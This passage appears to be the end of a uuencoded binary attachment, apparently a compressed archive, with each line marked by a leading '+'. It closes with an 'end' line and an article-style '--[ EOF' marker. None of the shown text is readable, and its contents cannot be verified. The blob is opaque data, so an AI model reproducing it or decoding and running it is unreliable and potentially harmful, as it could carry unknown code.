+M,49.$DL-+GPS"@OTF4'XC+;;,!C&9]-P>M.^+ZOQ%S$;HQ\Q&HK%K6'=ZFIE
+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
++\_\!1G2PPP#@`0``
+`
+end
+
+--[ EOF
